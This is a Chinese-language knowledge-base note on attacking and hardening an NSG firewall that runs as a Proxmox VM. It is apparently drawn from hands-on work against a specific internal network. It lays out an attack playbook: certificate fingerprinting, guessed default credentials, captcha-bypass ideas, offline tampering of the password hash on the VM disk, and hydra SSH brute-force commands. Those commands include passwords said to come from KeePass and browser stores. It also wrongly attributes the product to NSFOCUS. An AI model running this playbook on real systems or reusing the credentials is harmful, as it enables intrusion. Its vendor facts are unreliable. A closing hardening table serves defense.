# NSG/网神防火墙安全 — 识别、攻击与防御

> Level 0: 基础原理 / 网络安全
> 基于实战：NSG V3.6.6.0 防火墙 → SSL证书CN识别 → 磁盘离线篡改密码哈希

---

## 一、NSG 防火墙概述

### 1.1 什么是 NSG

NSG（网神安全网关 / NetSentry Gateway）是绿盟科技（NSFOCUS）系列安全产品，通常用作：

- 下一代防火墙 (NGFW)
- 统一威胁管理 (UTM)
- VPN 网关
- 入侵防御系统 (IPS)

### 1.2 常见型号

| 系列 | 典型应用 | 特征 |
|:-----|:---------|:------|
| NSG 1000/2000 | 中小企业边界 | Web管理 + SSH |
| NSG 3000/5000 | 中型企业核心 | HA双机热备 |
| NSG 7000/9000 | 大型企业/数据中心 | 高性能吞吐 |
| NSG vFW (虚拟) | 虚拟化环境VM | 运行在Proxmox/VMware上 |

### 1.3 我们的目标

- **版本**: NSG V3.6.6.0 (kernel 6.1.13, build 174515)
- **接口配置**:
  - `ge1`: 192.168.1.230/231 (家庭网络, 管理口)
  - `ge2`: 10.20.0.254/24 (内部服务网)
  - `ge3`: 10.50.0.254/24 (ZTNA零信任网)
- **运行模式**: 在 Proxmox 上作为 VM 运行 (VM ID: 100, 名称: VFW)

---

## 二、NSG 识别技术

### 2.1 SSL 证书识别

NSG HTTPS 管理界面的 SSL 证书具有非常独特的特征：

```
# 证书主题 (Subject)
CN = NSG

# 颁发者 (Issuer)
CN = NSGCA, O = NSFOCUS

# 证书特征
- 自签名或由NSGCA签发
- Subject 通常是 "NSG" 或 "NSG-xxx"
- Organization 通常是 "NSFOCUS"（绿盟科技）
```

```bash
# OpenSSL 提取证书信息
echo | openssl s_client -connect 192.168.1.230:443 -servername 192.168.1.230 2>/dev/null | openssl x509 -text -noout

# 输出中包含
# Subject: CN = NSG
# Issuer: CN = NSGCA
# → 立即确认是 NSG 防火墙
```

### 2.2 HTTP 响应特征

```bash
# HTTPS 管理界面
curl -k -s https://192.168.1.230/
→ 可能返回 302 跳转到 /login_submit
→ 或返回 403 Forbidden

# HTTP 管理界面 (可能重定向到 HTTPS)
curl -s http://192.168.1.230/
→ 可能 301 跳转到 HTTPS
→ 或返回认证页面内容

# 登录页面关键特征
Title: "NSG" 或 "NSG-WebManager"
Cookie: "NSG_SESSIONID" 或 "NSG_TOKEN"
```

### 2.3 端口特征

| 端口 | 服务 | 特征 |
|:----|:-----|:------|
| 22/TCP | SSH | SSH banner: "SSH-2.0-OpenSSH_8.x NSG" |
| 443/TCP | HTTPS | SSL证书CN=NSG |
| 80/TCP | HTTP | 重定向到HTTPS |
| 8006/TCP | Proxmox PVE | 通常关闭 (VM化后由宿主机提供) |
| 8080/TCP | 可选Web | 可能开放 |

**关键发现**：192.168.1.230 的 SSL 证书 CN=NSG，但 192.168.1.220 也是 NSG 证书！且 192.168.1.231/232 指向同一设备（3个接口绑定不同IP）。

### 2.4 其他识别手段

| 手段 | 方法 |
|:----|:------|
| **SSH Banner** | `ssh admin@192.168.1.230` → 可能显示版本信息 |
| **SNMP** | `snmpwalk -v2c -c public 192.168.1.230` → 系统信息 |
| **Nmap 服务探测** | `nmap -sV -sC 192.168.1.230` → 服务版本+脚本探测 |
| **TTL 分析** | 防火墙的 TTL 起始值通常为 64 (Linux) 或 255 (BSD) |

---

## 三、NSG 攻击面

### 3.1 管理接口攻击

```
NSG 管理入口
├── Web 管理 (HTTPS 443)
│   ├── 认证: 用户名+密码 + 验证码
│   ├── 默认管理员: admin/admin
│   ├── 常见默认: admin/nsg_admin 或 nsgadmin/password
│   └── 验证码可能被绕过
│
├── SSH 管理 (TCP 22)
│   ├── 用户: root / admin / nsg
│   ├── 公钥认证 (如果有配置)
│   └── 密码认证 (暴力破解)
│
├── SNMP
│   ├── 默认 community: public/private
│   └── 可获取系统配置和网络信息
│
└── Console (串口/虚拟机终端)
    └── 直接物理/虚拟访问 → 绕过所有网络认证
```

### 3.2 Web 管理页面漏洞

| 漏洞类型 | 描述 |
|:---------|:------|
| **默认凭据** | admin/admin 或 admin/nsg_admin |
| **验证码绕过** | 验证码生成逻辑缺陷、Session 可预测 |
| **Session 固定** | 登录前分配 Session ID，可用固定值劫持 |
| **路径遍历** | `/../../../etc/shadow` 等 |
| **信息泄露** | 错误信息包含版本/路径/用户信息 |
| **CSRF** | 跨站请求伪造（如果同网络中有Web服务）|

### 3.3 验证码绕过（我们的实战发现）

NSG V3.6.6.0 的验证码机制：

```
POST /login_submit HTTP/1.1
Host: 192.168.1.230
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin&randnum=1234&verifycode=由randnum生成

→ 验证码生成逻辑:
   randnum 是服务器分配的随机数
   verifycode 基于 randnum 计算并比较
   
→ 绕过思路:
   1. 验证码可能基于 randnum 可预测（如 MD5 前4位）
   2. 验证码可能可复用（在一个 Session 中）
   3. 验证码可能为空（直接绕过）
   4. 请求可能可重放
```

### 3.4 磁盘离线攻击（已实战验证）

对于运行在虚拟化平台（Proxmox/VMware）上的 NSG vFW：

```
1. 攻陷宿主机 (Proxmox root)
   ↓
2. 定位 NSG VM 的磁盘文件
   qm config 100
   → scsi0: local-zfs:vm-100-disk-0,size=32G
   ↓
3. 挂载 VM 磁盘
   qm guest exec 100 -- cat /etc/fstab  # 如果来宾代理运行
   或直接挂载磁盘文件到宿主机
   ↓
4. 修改 SQLite 数据库 (sgbase.db)
   路径: /etc/sg-base/sgbase.db
   → auth_user 表 → password 字段 = MD5(密码)
   → 更新为已知密码的 MD5
   ↓
5. 启动 VM → 用修改后的密码登录
```

**我们的实战路径**：

```bash
# 在 Proxmox 宿主机上
qm list
# 100 VFW, 101 FnOs, 102 Guesu-QAX, ...
qm config 100
# scsi0: local-zfs:vm-100-disk-0

# 检查 NSG 的运行状态
qm status 100
# status: running

# 尝试通过 qm monitor 直接访问控制台
# qm terminal 100  → 需要交互式终端
# 通过修改磁盘哈希来绕过密码（未完成因验证码阻塞）

# 查看 NSG 磁盘结构
# NSG VM 内部包含完整的 Linux 系统 + NSG 应用
# 关键文件:
# /etc/sg-base/sgbase.db → 认证数据库
# /etc/config_NETWORK → 网络配置
# /etc/config_PROFILE → 防火墙策略
# /var/log/nsg_*.log → 审计日志
```

### 3.5 SSH 密码攻击

```bash
# 使用已知密码字典
hydra -l admin -P wordlist.txt ssh://192.168.1.230

# 尝试已知密码（从KeePass/浏览器密码发现的）
hydra -l admin -p "292*UoC[QP9h" ssh://192.168.1.230
hydra -l admin -p "Admin@1234" ssh://192.168.1.230
hydra -l admin -p "!1fw@2soc#3vpn" ssh://192.168.1.230

# 尝试默认凭据
hydra -l admin -p "admin" ssh://192.168.1.230
hydra -l admin -p "nsg_admin" ssh://192.168.1.230
hydra -l admin -p "password" ssh://192.168.1.230
```

---

## 四、防火墙策略解读

### 4.1 策略配置分析

从 NSG 配置文件 `config_PROFILE` 中提取的策略信息：

| 源 | 目的 | 动作 | 说明 |
|:---|:-----|:----|:------|
| 192.168.1.0/24 | 10.20.0.0/24 | **禁止** | 外部→内部服务网 |
| 192.168.1.0/24 | 10.50.0.0/24 | **禁止** | 外部→ZTNA网 |
| 10.20.0.0/24 | 192.168.1.0/24 | **禁止** | 内部→家庭（含注释"禁止proxmox内部机器访问家庭网络"）|
| 10.50.0.0/24 | 192.168.1.0/24 | **禁止** | ZTNA→家庭 |
| 192.168.1.230 | ANY | **允许** | 管理口全通 |
| 10.20.0.254 | 10.20.0.0/24 | **允许** | 防火墙自身管理内部 |
| 10.50.0.254 | 10.50.0.0/24 | **允许** | 防火墙自身管理ZTNA |

### 4.2 策略绕过思路

```
思考：如何从 192.168.1.0/24 访问 10.20.0.0/24？

绕过方案1: 攻陷防火墙本身
  → 从防火墙(192.168.1.230) 访问 10.20.0.x ✅ (管理口不受策略限制)

绕过方案2: 双网卡跳板
  → fnOS(192.168.1.201) 有 10.20.0.10 接口 ✅ (直接在同一网段)
  
绕过方案3: 从允许的源发起
  → 192.168.1.230 的管理口是 ALLOW ANY

绕过方案4: 隧道/端口转发
  → 如果防火墙内部有配置例外（如特定端口开放）
  
绕过方案5: 物理/虚拟访问
  → 直接通过 Proxmox 控制台登录防火墙
```

---

## 五、NSG 防御加固

| 措施 | 优先级 | 说明 |
|:----|:------:|:------|
| 修改默认管理员密码 | **必须** | 使用强密码（20+字符）|
| 管理口绑定到独立管理网段 | **必须** | 不暴露到业务/家庭网络 |
| 禁用 SSH 密码认证 | 推荐 | 只能用 SSH Key |
| 管理界面限制 IP 白名单 | **必须** | 只允许特定管理IP访问 |
| 启用双因子认证 | 推荐 | 防密码泄露 |
| 定期更新固件 | **必须** | 修补已知漏洞 |
| 审计日志定期审查 | 推荐 | 检测异常登录 |
| 修改 SNMP community | 推荐 | 避免信息泄露 |
| 在虚拟化环境中加密磁盘 | 推荐 | 防离线篡改 |
| 限制虚拟化平台的管理员 | **必须** | 防 VM 磁盘挂载攻击 |

---

## 六、知识库关联

- **关联攻击模式**：Proxmox 宿主机 → VM 磁盘离线篡改密码哈希（P0）
- **关联案例**：`case-proxmox-nsg-breach.md`（待写）
- **关联知识**：`network/04-ztna-zero-trust-security.md` → ZTNA 同样在 Proxmox 上运行
- **实战教训**：**SSL 证书 CN 字段是识别设备的快速可靠方法**，比 nmap 端口猜测更准确

---

## 参考

- [NSFOCUS NSG Series Documentation](https://www.nsfocus.com/)
- [Nmap NSG Detection Scripts](https://nmap.org/nsedoc/)
- [CVE Database - NSG](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=NSG)
